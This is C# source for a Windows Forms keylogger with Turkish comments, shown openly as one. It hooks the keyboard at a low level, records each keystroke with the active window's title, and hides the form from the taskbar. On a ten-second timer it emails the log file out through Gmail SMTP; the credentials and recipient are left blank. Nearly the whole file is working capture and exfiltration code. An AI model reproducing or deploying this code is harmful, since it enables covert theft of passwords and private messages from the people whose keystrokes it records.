namespace KeyloggerForm
{
    using System;
    using System.IO;
    using System.Runtime.InteropServices;
    using System.Text;
    using System.Windows.Forms;
    using System.Net;
    using System.Net.Mail;

    public partial class Form1 : Form
    {
        

        // Dosyaya yazmak i�in StreamWriter
        private static StreamWriter logWriter;

        
        public Form1()
        {
            InitializeComponent();
            InitLogger(); // program ba�larken log dosyas�n� a�
        }

        private static void InitLogger()
        {
            logWriter = new StreamWriter(
                new FileStream(logPath, FileMode.Append, FileAccess.Write, FileShare.ReadWrite),
                Encoding.UTF8
            )
            { AutoFlush = true };
        }

        private static void CloseLogger()
        {
            logWriter?.Dispose();
        }

        private static void WriteLog(string text)
        {
            if (logWriter == null) return; // g�venlik
            logWriter.Write(text);
        }
        private void WriteLog(string fileName, string text)
        {
            try
            {
                using (var sw = new StreamWriter(fileName, true, Encoding.UTF8))
                {
                    sw.WriteLine($"{DateTime.Now}: {text}");
                }
            }
            catch (IOException)
            {
                // Dosya kilitliyse bekle ve tekrar dene
                Thread.Sleep(100);
                using (var sw = new StreamWriter(fileName, true, Encoding.UTF8))
                {
                    sw.WriteLine($"{DateTime.Now}: {text}");
                }
            }
        }




        
        private void MailGonder()
        {
            using (var client = new SmtpClient("smtp.gmail.com", 587))
            {
                client.Credentials = new NetworkCredential(
                    "",
                    ""); // Google uygulama �ifresi
                client.EnableSsl = true;

                var mail = new MailMessage();
                mail.From = new MailAddress("");
                mail.To.Add("");
                mail.Subject = "Keylogger Log " + DateTime.Now.ToString("HH:mm:ss");
                mail.Body = "Log dosyas� ektedir.";

                string logPath = @"C:\Users\Halil\source\repos\KeyloggerForm\KeyloggerForm\bin\Debug\net8.0-windows\keylog.txt";

                try
                {
                    if (File.Exists(logPath))
                    {
                        // Dosyay� kilitlenmeden eklemek i�in FileStream kullan
                        using (FileStream fs = new FileStream(logPath, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
                        {
                            Attachment attachment = new Attachment(fs, Path.GetFileName(logPath));
                            mail.Attachments.Add(attachment);

                            client.Send(mail); // SENKRON g�nderim
                        }
                    }
                    else
                    {
                        mail.Body += "\n\n(Not: Log dosyas� bulunamad�)";
                        client.Send(mail);
                    }
                }
                catch (Exception ex)
                {
                    MessageBox.Show("Ek dosya eklenirken hata: " + ex.Message);
                }
            }
        }





        private static string logPath = Path.Combine(
        AppDomain.CurrentDomain.BaseDirectory, "keylog.txt"
    );

        private NotifyIcon trayIcon = new NotifyIcon();
        private ContextMenuStrip trayMenu = new ContextMenuStrip();

        private void OnExit(object sender, EventArgs e)
        {
            trayIcon.Visible = false;
            Application.Exit();
        }
        private void OnOpenLog(object? sender, EventArgs e)
        {
            string logPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "keylog.txt");

            if (File.Exists(logPath))
            {
                System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo()
                {
                    FileName = logPath,
                    UseShellExecute = true,
                });
            }
            else
            {
                MessageBox.Show("Log dosyas� bulunamad�.", "Bilgi", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
        }

        private void OnClearLog(object sender, EventArgs e)
        {
            if (File.Exists(logPath))
            {
                File.WriteAllText(logPath, ""); //dosya s�f�rla
                MessageBox.Show("Log dosyas� temizlendi. ", "Bilgi", MessageBoxButtons.OK, MessageBoxIcon.Information);

            }
            else
            {
                MessageBox.Show("Log dosyas� bulunamad�.", "Uyar�", MessageBoxButtons.OK, MessageBoxIcon.Warning);
            }

        }


        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private static LowLevelKeyboardProc proc = HookCallback;

        private static IntPtr hookID = IntPtr.Zero;

        protected override void OnFormClosed(FormClosedEventArgs e)
        {
            UnhookWindowsHookEx(hookID);
            base.OnFormClosed(e);
        }
        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            var currentProcess = System.Diagnostics.Process.GetCurrentProcess();
            var currentModule = currentProcess.MainModule;

            if (currentModule != null)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(currentModule.ModuleName), 0);
            }
            else
            {
                throw new Exception("MainModule al�namad�.");
            }
        }
        // Yard�mc� fonksiyon: ger�ek karakteri d�nd�r�r
        private static string GetCharFromKey(Keys key, int vkCode)
        {
            byte[] keyboardState = new byte[256];
            GetKeyboardState(keyboardState);

            // CapsLock ve Shift durumunu kontrol et
            bool capsLock = (GetKeyState(0x14) & 0x0001) != 0; // 0x14 = CapsLock
            bool shift = (GetKeyState(0x10) & 0x8000) != 0;    // 0x10 = Shift

            uint virtualKey = (uint)key;
            uint scanCode = 0;
            StringBuilder sb = new StringBuilder(2);

            IntPtr layout = GetKeyboardLayout(0);

            int result = ToUnicodeEx(virtualKey, scanCode, keyboardState, sb, sb.Capacity, 0, layout);

            if (result > 0)
            {
                string ch = sb.ToString();

                // E�er harfse, CapsLock ve Shift durumuna g�re b�y�t/k���lt
                if (char.IsLetter(ch[0]))
                {
                    if (capsLock ^ shift) // XOR: biri a��k, di�eri kapal�ysa b�y�k
                        ch = ch.ToUpper();
                    else
                        ch = ch.ToLower();
                }

                return ch;
            }
            else
            {
                // �zel tu�lar
                switch (key)
                {
                    case Keys.Enter: return "[ENTER]";
                    case Keys.Space: return " ";
                    case Keys.Back: return "[BACKSPACE]";
                    case Keys.Tab: return "[TAB]";
                    default: return "";
                }
            }
        }




        // Logu bellekte tutmak i�in bir StringBuilder
        private static StringBuilder currentLine = new StringBuilder();

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                Keys key = (Keys)vkCode;

                switch (key)
                {
                    case Keys.Enter:
                        string windowTitle = GetActiveWindowTitle();
                        WriteLog(Environment.NewLine);
                        WriteLog($"[{DateTime.Now:yyyy-MM-dd HH:mm:ss}] ({windowTitle}) {currentLine}");
                        currentLine.Clear();
                        break;

                    case Keys.Space:
                        currentLine.Append(" ");
                        WriteLog(" ");
                        break;

                    case Keys.Back:
                        if (currentLine.Length > 0)
                            currentLine.Remove(currentLine.Length - 1, 1);
                        WriteLog("[BACKSPACE]");
                        break;

                    case Keys.Tab:
                        currentLine.Append("\t");
                        WriteLog("[TAB]");
                        break;

                    default:
                        string karakter = GetCharFromKey(key, vkCode);
                        if (string.IsNullOrEmpty(karakter))
                            karakter = GetTurkishChar(vkCode);

                        currentLine.Append(karakter);
                        WriteLog(karakter);
                        break;
                }
            }

            return CallNextHookEx(hookID, nCode, wParam, lParam);
        }

        private static string GetTurkishChar(int vkCode)
        {
            switch (vkCode)
            {
                case 0xDB: return "�";
                case 0xDC: return "�";
                case 0xBA: return "�";
                case 0xC0: return "�";
                case 0xDE: return "�";
                case 0xBF: return "�";

                case 0xE2: return "�";
                case 0xDD: return "�";
                case 0xBC: return "�";
                case 0xA0: return "�";
                case 0xBE: return "�";
                case 0x9F: return "�";

                default: return "";
            }
        }

        // Gerekli DLL importlar�
        [DllImport("user32.dll")]
        private static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        private static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);

        private static string GetActiveWindowTitle()
        {
            const int nChars = 256;
            StringBuilder Buff = new StringBuilder(nChars);
            IntPtr handle = GetForegroundWindow();

            if (GetWindowText(handle, Buff, nChars) > 0)
                return Buff.ToString();
            return "Unknown Window";
        }
        // user32.dll fonksiyonlar�
        [DllImport("user32.dll")]
        public static extern int ToUnicodeEx(
            uint wVirtKey,
            uint wScanCode,
            byte[] lpKeyState,
            [Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder pwszBuff,
            int cchBuff,
            uint wFlags,
            IntPtr dwhkl);

        [DllImport("user32.dll")]
        public static extern bool GetKeyboardState(byte[] lpKeyState);

        [DllImport("user32.dll")]
        public static extern IntPtr GetKeyboardLayout(uint idThread);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll")]
        private static extern short GetKeyState(int nVirtKey);

        // kernel32.dll fonksiyonlar�
        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        

        private void Form1_Load(object sender, EventArgs e)
        {
            // Uygulama a��l���nda timer �al��s�n
            timer1.Interval = 10000;
            timer1.Start();

            hookID = SetHook(proc);

            //formu gizle
            this.WindowState = FormWindowState.Minimized;
            this.ShowInTaskbar = false;
            this.Hide();


            //tepsi menu olu�tur
            trayMenu = new ContextMenuStrip();
            trayMenu.Items.Add("Log dosyas�n� a�", null, OnOpenLog);
            trayMenu.Items.Add("Log'u temizle", null, OnClearLog);
            trayMenu.Items.Add("��k��", null, OnExit);



            //notifyIcon olu�tur
            trayIcon = new NotifyIcon();
            trayIcon.Text = "Keylogger Aktif";
            trayIcon.Icon = SystemIcons.Application;
            trayIcon.ContextMenuStrip = trayMenu; //ba�lama burada!
            trayIcon.Visible = true;

           



        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            timer1.Stop(); // �ak��may� �nle
            try
            {
                MailGonder(); // Senkron �a�r�
                

            }
            catch (Exception ex)
            {
                WriteLog("error.log", ex.ToString());
            }
            finally
            {
                timer1.Start(); // ��lem bitince tekrar ba�lat
            }
        }


    }
}
